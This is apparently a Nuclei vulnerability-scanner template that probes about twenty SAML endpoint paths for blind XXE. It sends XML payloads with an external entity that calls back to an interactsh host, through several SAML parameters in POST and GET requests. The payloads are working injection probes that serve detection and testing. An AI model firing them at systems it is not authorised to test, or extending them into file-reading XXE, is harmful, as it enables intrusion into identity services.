id: saml-xxe-blind

info:
  name: SAML XXE Blind Detection - All Parameters
  author: nuclei-templates
  severity: critical
  description: Détecte les vulnérabilités XXE blind dans les endpoints SAML via tous les paramètres SAML possibles
  tags: saml,xxe,blind,ssrf

variables:
  saml_payload: "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE samlp:Response [<!ENTITY % remote SYSTEM \"http://{{interactsh-url}}\">%remote;]>"
  saml_request_payload: "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE samlp:AuthnRequest [<!ENTITY % remote SYSTEM \"http://{{interactsh-url}}\">%remote;]>"
  saml_assertion_payload: "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE saml:Assertion [<!ENTITY % remote SYSTEM \"http://{{interactsh-url}}\">%remote;]>"

http:
  - method: POST
    path:
      - "{{BaseURL}}/aveksa/main"
      - "{{BaseURL}}/saml/acs"
      - "{{BaseURL}}/saml/SSO"
      - "{{BaseURL}}/sso/saml"
      - "{{BaseURL}}/saml2/acs"
      - "{{BaseURL}}/saml/acs/post"
      - "{{BaseURL}}/saml/consume"
      - "{{BaseURL}}/saml/login"
      - "{{BaseURL}}/saml/response"
      - "{{BaseURL}}/saml/assertion"
      - "{{BaseURL}}/saml/validate"
      - "{{BaseURL}}/saml/process"
      - "{{BaseURL}}/sso/saml/acs"
      - "{{BaseURL}}/sso/saml/SSO"
      - "{{BaseURL}}/sso/saml2/acs"
      - "{{BaseURL}}/idp/saml/acs"
      - "{{BaseURL}}/idp/saml/SSO"
      - "{{BaseURL}}/auth/saml/acs"
      - "{{BaseURL}}/auth/saml/SSO"
      - "{{BaseURL}}/login/saml/acs"
      - "{{BaseURL}}/login/saml/SSO"

    headers:
      Content-Type: application/x-www-form-urlencoded
      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36

    body: "SAMLResponse={{base64(saml_payload)}}"

    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "http"
        condition: and

  - method: POST
    path:
      - "{{BaseURL}}/saml/acs"
      - "{{BaseURL}}/saml/SSO"
      - "{{BaseURL}}/sso/saml"
      - "{{BaseURL}}/saml2/acs"
      - "{{BaseURL}}/saml/acs/post"
      - "{{BaseURL}}/saml/consume"
      - "{{BaseURL}}/saml/login"
      - "{{BaseURL}}/saml/response"
      - "{{BaseURL}}/saml/assertion"
      - "{{BaseURL}}/saml/validate"
      - "{{BaseURL}}/saml/process"
      - "{{BaseURL}}/sso/saml/acs"
      - "{{BaseURL}}/sso/saml/SSO"
      - "{{BaseURL}}/sso/saml2/acs"
      - "{{BaseURL}}/idp/saml/acs"
      - "{{BaseURL}}/idp/saml/SSO"
      - "{{BaseURL}}/auth/saml/acs"
      - "{{BaseURL}}/auth/saml/SSO"
      - "{{BaseURL}}/login/saml/acs"
      - "{{BaseURL}}/login/saml/SSO"

    headers:
      Content-Type: application/x-www-form-urlencoded
      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36

    body: "SAMLRequest={{base64(saml_request_payload)}}"

    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "http"
        condition: and

  - method: POST
    path:
      - "{{BaseURL}}/saml/acs"
      - "{{BaseURL}}/saml/SSO"
      - "{{BaseURL}}/sso/saml"
      - "{{BaseURL}}/saml2/acs"
      - "{{BaseURL}}/saml/acs/post"
      - "{{BaseURL}}/saml/consume"
      - "{{BaseURL}}/saml/login"
      - "{{BaseURL}}/saml/response"
      - "{{BaseURL}}/saml/assertion"
      - "{{BaseURL}}/saml/validate"
      - "{{BaseURL}}/saml/process"
      - "{{BaseURL}}/sso/saml/acs"
      - "{{BaseURL}}/sso/saml/SSO"
      - "{{BaseURL}}/sso/saml2/acs"
      - "{{BaseURL}}/idp/saml/acs"
      - "{{BaseURL}}/idp/saml/SSO"
      - "{{BaseURL}}/auth/saml/acs"
      - "{{BaseURL}}/auth/saml/SSO"
      - "{{BaseURL}}/login/saml/acs"
      - "{{BaseURL}}/login/saml/SSO"

    headers:
      Content-Type: application/x-www-form-urlencoded
      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36

    body: "Assertion={{base64(saml_assertion_payload)}}"

    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "http"
        condition: and

  - method: POST
    path:
      - "{{BaseURL}}/saml/acs"
      - "{{BaseURL}}/saml/SSO"
      - "{{BaseURL}}/sso/saml"
      - "{{BaseURL}}/saml2/acs"
      - "{{BaseURL}}/saml/acs/post"
      - "{{BaseURL}}/saml/consume"
      - "{{BaseURL}}/saml/login"
      - "{{BaseURL}}/saml/response"
      - "{{BaseURL}}/saml/assertion"
      - "{{BaseURL}}/saml/validate"
      - "{{BaseURL}}/saml/process"
      - "{{BaseURL}}/sso/saml/acs"
      - "{{BaseURL}}/sso/saml/SSO"
      - "{{BaseURL}}/sso/saml2/acs"
      - "{{BaseURL}}/idp/saml/acs"
      - "{{BaseURL}}/idp/saml/SSO"
      - "{{BaseURL}}/auth/saml/acs"
      - "{{BaseURL}}/auth/saml/SSO"
      - "{{BaseURL}}/login/saml/acs"
      - "{{BaseURL}}/login/saml/SSO"

    headers:
      Content-Type: application/x-www-form-urlencoded
      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36

    body: "RelayState={{base64(saml_payload)}}"

    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "http"
        condition: and

  - method: POST
    path:
      - "{{BaseURL}}/saml/acs"
      - "{{BaseURL}}/saml/SSO"
      - "{{BaseURL}}/sso/saml"
      - "{{BaseURL}}/saml2/acs"
      - "{{BaseURL}}/saml/acs/post"
      - "{{BaseURL}}/saml/consume"
      - "{{BaseURL}}/saml/login"
      - "{{BaseURL}}/saml/response"
      - "{{BaseURL}}/saml/assertion"
      - "{{BaseURL}}/saml/validate"
      - "{{BaseURL}}/saml/process"
      - "{{BaseURL}}/sso/saml/acs"
      - "{{BaseURL}}/sso/saml/SSO"
      - "{{BaseURL}}/sso/saml2/acs"
      - "{{BaseURL}}/idp/saml/acs"
      - "{{BaseURL}}/idp/saml/SSO"
      - "{{BaseURL}}/auth/saml/acs"
      - "{{BaseURL}}/auth/saml/SSO"
      - "{{BaseURL}}/login/saml/acs"
      - "{{BaseURL}}/login/saml/SSO"

    headers:
      Content-Type: application/x-www-form-urlencoded
      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36

    body: "AuthnRequest={{base64(saml_request_payload)}}"

    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "http"
        condition: and

  - method: POST
    path:
      - "{{BaseURL}}/saml/acs"
      - "{{BaseURL}}/saml/SSO"
      - "{{BaseURL}}/sso/saml"
      - "{{BaseURL}}/saml2/acs"
      - "{{BaseURL}}/saml/acs/post"
      - "{{BaseURL}}/saml/consume"
      - "{{BaseURL}}/saml/login"
      - "{{BaseURL}}/saml/response"
      - "{{BaseURL}}/saml/assertion"
      - "{{BaseURL}}/saml/validate"
      - "{{BaseURL}}/saml/process"
      - "{{BaseURL}}/sso/saml/acs"
      - "{{BaseURL}}/sso/saml/SSO"
      - "{{BaseURL}}/sso/saml2/acs"
      - "{{BaseURL}}/idp/saml/acs"
      - "{{BaseURL}}/idp/saml/SSO"
      - "{{BaseURL}}/auth/saml/acs"
      - "{{BaseURL}}/auth/saml/SSO"
      - "{{BaseURL}}/login/saml/acs"
      - "{{BaseURL}}/login/saml/SSO"

    headers:
      Content-Type: application/x-www-form-urlencoded
      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36

    body: "LogoutRequest={{base64(saml_request_payload)}}"

    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "http"
        condition: and

  - method: POST
    path:
      - "{{BaseURL}}/saml/acs"
      - "{{BaseURL}}/saml/SSO"
      - "{{BaseURL}}/sso/saml"
      - "{{BaseURL}}/saml2/acs"
      - "{{BaseURL}}/saml/acs/post"
      - "{{BaseURL}}/saml/consume"
      - "{{BaseURL}}/saml/login"
      - "{{BaseURL}}/saml/response"
      - "{{BaseURL}}/saml/assertion"
      - "{{BaseURL}}/saml/validate"
      - "{{BaseURL}}/saml/process"
      - "{{BaseURL}}/sso/saml/acs"
      - "{{BaseURL}}/sso/saml/SSO"
      - "{{BaseURL}}/sso/saml2/acs"
      - "{{BaseURL}}/idp/saml/acs"
      - "{{BaseURL}}/idp/saml/SSO"
      - "{{BaseURL}}/auth/saml/acs"
      - "{{BaseURL}}/auth/saml/SSO"
      - "{{BaseURL}}/login/saml/acs"
      - "{{BaseURL}}/login/saml/SSO"

    headers:
      Content-Type: application/x-www-form-urlencoded
      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36

    body: "LogoutResponse={{base64(saml_payload)}}"

    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "http"
        condition: and

  - method: GET
    path:
      - "{{BaseURL}}/saml/acs"
      - "{{BaseURL}}/saml/SSO"
      - "{{BaseURL}}/sso/saml"
      - "{{BaseURL}}/saml2/acs"
      - "{{BaseURL}}/saml/acs/post"
      - "{{BaseURL}}/saml/consume"
      - "{{BaseURL}}/saml/login"
      - "{{BaseURL}}/saml/response"
      - "{{BaseURL}}/saml/assertion"
      - "{{BaseURL}}/saml/validate"
      - "{{BaseURL}}/saml/process"
      - "{{BaseURL}}/sso/saml/acs"
      - "{{BaseURL}}/sso/saml/SSO"
      - "{{BaseURL}}/sso/saml2/acs"
      - "{{BaseURL}}/idp/saml/acs"
      - "{{BaseURL}}/idp/saml/SSO"
      - "{{BaseURL}}/auth/saml/acs"
      - "{{BaseURL}}/auth/saml/SSO"
      - "{{BaseURL}}/login/saml/acs"
      - "{{BaseURL}}/login/saml/SSO"

    headers:
      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36

    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "http"
        condition: and

  - method: GET
    path:
      - "{{BaseURL}}/saml/acs?SAMLResponse={{base64(saml_payload)}}"
      - "{{BaseURL}}/saml/SSO?SAMLResponse={{base64(saml_payload)}}"
      - "{{BaseURL}}/sso/saml?SAMLResponse={{base64(saml_payload)}}"
      - "{{BaseURL}}/saml2/acs?SAMLResponse={{base64(saml_payload)}}"
      - "{{BaseURL}}/saml/acs/post?SAMLResponse={{base64(saml_payload)}}"
      - "{{BaseURL}}/saml/consume?SAMLResponse={{base64(saml_payload)}}"
      - "{{BaseURL}}/saml/login?SAMLResponse={{base64(saml_payload)}}"
      - "{{BaseURL}}/saml/response?SAMLResponse={{base64(saml_payload)}}"
      - "{{BaseURL}}/saml/assertion?SAMLResponse={{base64(saml_payload)}}"
      - "{{BaseURL}}/saml/validate?SAMLResponse={{base64(saml_payload)}}"
      - "{{BaseURL}}/saml/process?SAMLResponse={{base64(saml_payload)}}"
      - "{{BaseURL}}/sso/saml/acs?SAMLResponse={{base64(saml_payload)}}"
      - "{{BaseURL}}/sso/saml/SSO?SAMLResponse={{base64(saml_payload)}}"
      - "{{BaseURL}}/sso/saml2/acs?SAMLResponse={{base64(saml_payload)}}"
      - "{{BaseURL}}/idp/saml/acs?SAMLResponse={{base64(saml_payload)}}"
      - "{{BaseURL}}/idp/saml/SSO?SAMLResponse={{base64(saml_payload)}}"
      - "{{BaseURL}}/auth/saml/acs?SAMLResponse={{base64(saml_payload)}}"
      - "{{BaseURL}}/auth/saml/SSO?SAMLResponse={{base64(saml_payload)}}"
      - "{{BaseURL}}/login/saml/acs?SAMLResponse={{base64(saml_payload)}}"
      - "{{BaseURL}}/login/saml/SSO?SAMLResponse={{base64(saml_payload)}}"

    headers:
      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36

    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "http"
        condition: and

  - method: GET
    path:
      - "{{BaseURL}}/saml/acs?SAMLRequest={{base64(saml_request_payload)}}"
      - "{{BaseURL}}/saml/SSO?SAMLRequest={{base64(saml_request_payload)}}"
      - "{{BaseURL}}/sso/saml?SAMLRequest={{base64(saml_request_payload)}}"
      - "{{BaseURL}}/saml2/acs?SAMLRequest={{base64(saml_request_payload)}}"
      - "{{BaseURL}}/saml/acs/post?SAMLRequest={{base64(saml_request_payload)}}"
      - "{{BaseURL}}/saml/consume?SAMLRequest={{base64(saml_request_payload)}}"
      - "{{BaseURL}}/saml/login?SAMLRequest={{base64(saml_request_payload)}}"
      - "{{BaseURL}}/saml/response?SAMLRequest={{base64(saml_request_payload)}}"
      - "{{BaseURL}}/saml/assertion?SAMLRequest={{base64(saml_request_payload)}}"
      - "{{BaseURL}}/saml/validate?SAMLRequest={{base64(saml_request_payload)}}"
      - "{{BaseURL}}/saml/process?SAMLRequest={{base64(saml_request_payload)}}"
      - "{{BaseURL}}/sso/saml/acs?SAMLRequest={{base64(saml_request_payload)}}"
      - "{{BaseURL}}/sso/saml/SSO?SAMLRequest={{base64(saml_request_payload)}}"
      - "{{BaseURL}}/sso/saml2/acs?SAMLRequest={{base64(saml_request_payload)}}"
      - "{{BaseURL}}/idp/saml/acs?SAMLRequest={{base64(saml_request_payload)}}"
      - "{{BaseURL}}/idp/saml/SSO?SAMLRequest={{base64(saml_request_payload)}}"
      - "{{BaseURL}}/auth/saml/acs?SAMLRequest={{base64(saml_request_payload)}}"
      - "{{BaseURL}}/auth/saml/SSO?SAMLRequest={{base64(saml_request_payload)}}"
      - "{{BaseURL}}/login/saml/acs?SAMLRequest={{base64(saml_request_payload)}}"
      - "{{BaseURL}}/login/saml/SSO?SAMLRequest={{base64(saml_request_payload)}}"

    headers:
      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36

    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "http"
        condition: and
